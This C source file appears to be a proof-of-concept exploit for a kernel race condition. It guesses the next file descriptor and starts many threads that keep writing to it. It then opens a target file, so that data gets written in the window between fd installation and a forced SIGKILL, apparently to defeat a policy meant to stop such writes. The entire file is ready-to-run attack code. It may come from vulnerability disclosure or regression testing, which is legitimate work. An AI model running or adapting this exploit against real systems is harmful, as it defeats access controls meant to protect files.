#include <bsd/stdlib.h>

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define SECRET "secret\n"

void
usage(void)
{
	errx(1, "usage: %s [-w num_workers] filepath", getprogname());
}

void *
writer(void *vpfd)
{
	ssize_t n;
	int fd = *(int *)vpfd;

	/*
	 * We'll just hammer write the guessed file descriptor, if we succeed we
	 * just bail as the parent thread is about to all alone die anyway.
	 */
	while (1) {
		n = write(fd, SECRET, strlen(SECRET));
		/* We expect to get EBADFD mostly */
		if (n <= 0) {
			continue;
		}
		/* The dude abides */
		break;
	}

	return (NULL);
}

#define msleep(x) usleep((x) * 1000)

int
main(int argc, char *argv[])
{
	int fd, ch, num_workers;
	pthread_t t_writer;
	struct stat st;
	const char *path;

	num_workers = 12;
	while ((ch = getopt(argc, argv, "w:")) != -1) {
		const char *errstr;
		switch (ch) {
		case 'w':
			num_workers = strtonum(optarg, 1, 512, &errstr);
			if (errstr)
				errx(1, "number of workers must be 1-512");
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;
	if (!argc)
		usage();

	/*
	 * Prevent me from shooting myself in the foot
	 */
	path = argv[0];
	if (stat(path, &st) == 0 && st.st_size != 0) {
		printf("secret is not empty(%zd bytes), maybe we cracked it before?\n",
		    st.st_size);
		exit(0);
	}

	/*
	 * Guess the next file descriptor open will get
	 */
	if ((fd = dup(0)) == -1)
		err(1, "dup");
	close(fd);

	/*
	 * Hammer Time, spawn a bunch of threads to write at the guessed fd,
	 * they hammer even before we open.
	 */
	while (num_workers--)
		if (pthread_create(&t_writer, NULL, writer, &fd) == -1)
			err(1, "pthread_create");

	/* Give the workers some lead time */
	msleep(10);

	/*
	 * This should never return, since we are supposed to be SIGKILLed.
	 * The race depends on the workers hitting the filedescriptor after
	 * open(2) succeeded (after fd_install()) but before
	 * exit_to_user_mode()->do_group_exit().
	 */
	fd = open(path, O_RDWR|O_CREAT, 0660);
	errx(1, "not killed, open returned fd %d", fd);

	return (0);		/* NOTREACHED */
}
